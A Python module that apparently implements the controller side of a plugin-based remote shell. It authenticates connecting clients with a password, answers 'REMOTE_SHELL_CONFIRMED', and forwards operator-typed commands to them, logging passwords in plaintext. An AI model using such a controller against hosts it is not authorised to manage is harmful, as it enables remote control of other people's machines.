# server_code/client_commands.py

import logging
import threading

class ClientCommands:
    """
    Encapsulates logic for handling authenticated client commands and sessions.
    """

    def __init__(self, main_server):
        self.main_server = main_server

    def register(self, server_socket):
        logging.info("[ClientCommands] Registering client commands plugin...")
        return server_socket

    def unregister(self, server_socket):
        logging.info("[ClientCommands] Unregistering client commands plugin...")
        return server_socket

    def handle_client(self, conn, addr):
        logging.info(f"[ClientCommands] Connected by {addr}")
        with conn:
            # Notify plugins about the new connection
            for plugin_module in self.main_server.ENABLED_PLUGINS.values():
                if hasattr(plugin_module, "on_connection_accepted"):
                    plugin_module.on_connection_accepted(conn, addr)

            # Authenticate the client
            if not self.authenticate_client(conn):
                logging.info("[ClientCommands] Authentication failed. Closing connection.")
                return

            # Handle further commands
            self.handle_commands(conn)

    def authenticate_client(self, conn) -> bool:
        try:
            data = conn.recv(self.main_server.BUFFER_SIZE).decode(errors="replace").strip()
            if data == self.main_server.SERVER_PASSWORD:
                logging.info("[ClientCommands] Client authenticated successfully.")
                conn.sendall(b"REMOTE_SHELL_CONFIRMED\n")

                # Notify plugins post-authentication
                for plugin in self.main_server.ENABLED_PLUGINS.values():
                    if hasattr(plugin, "on_connection_established"):
                        plugin.on_connection_established()
                return True
            else:
                logging.warning("[ClientCommands] Client failed authentication.")
                conn.sendall(b"AUTHENTICATION_FAILED\n")
                return False
        except Exception as ex:
            logging.error(f"[ClientCommands] Error during authentication: {ex}")
            return False

    def handle_commands(self, conn):
        """
        Reads commands from the server console (input()) and either:
          - interpret them locally (status, enable plugin, etc.)
          - pass them to the client
        """
        logging.info("[ClientCommands] Type 'exit' to close this client connection.")
        while True:
            try:
                command = input("server> ")
                if not command:
                    continue

                parts = command.strip().split()
                if not parts:
                    continue
                cmd_name = parts[0].lower()

                # Handle local commands
                if cmd_name == "exit":
                    logging.info("[ClientCommands] Closing client connection.")
                    break
                elif cmd_name == "status":
                    logging.info(self.main_server.get_status())
                    continue
                elif cmd_name == "enable" and len(parts) == 2:
                    plugin_name = parts[1]
                    if self.main_server.enable_plugin(plugin_name):
                        logging.info(f"[ClientCommands] Plugin '{plugin_name}' enabled.")
                    else:
                        logging.warning(f"[ClientCommands] Failed to enable plugin '{plugin_name}'.")
                    continue
                elif cmd_name == "disable" and len(parts) == 2:
                    plugin_name = parts[1]
                    if self.main_server.disable_plugin(plugin_name):
                        logging.info(f"[ClientCommands] Plugin '{plugin_name}' disabled.")
                    else:
                        logging.warning(f"[ClientCommands] Failed to disable plugin '{plugin_name}'.")
                    continue
                elif cmd_name == "change" and len(parts) >= 3:
                    sub_cmd = parts[1].lower()
                    value = parts[2]
                    if sub_cmd == "pass":
                        old_pass = self.main_server.SERVER_PASSWORD
                        self.main_server.SERVER_PASSWORD = value
                        logging.info(f"[ClientCommands] Password changed from '{old_pass}' to '{value}'.")
                    else:
                        logging.info("[ClientCommands] Usage: change pass <new_password>")
                    continue

                # Let plugins intercept commands
                handled = False
                for plugin_name, plugin_module in self.main_server.ENABLED_PLUGINS.items():
                    if hasattr(plugin_module, "on_command"):
                        try:
                            if plugin_module.on_command(command, conn, self.main_server.MAIN_SERVER_SOCKET):
                                handled = True
                                break
                        except Exception as e:
                            logging.error(f"[ClientCommands] Plugin '{plugin_name}' failed: {e}")

                if handled:
                    continue

                # Forward unhandled commands to the client
                conn.sendall(command.encode('utf-8'))

            except (EOFError, KeyboardInterrupt):
                logging.info("[ClientCommands] Command loop interrupted. Closing connection.")
                break
            except Exception as ex:
                logging.error(f"[ClientCommands] Error processing command: {ex}")
                break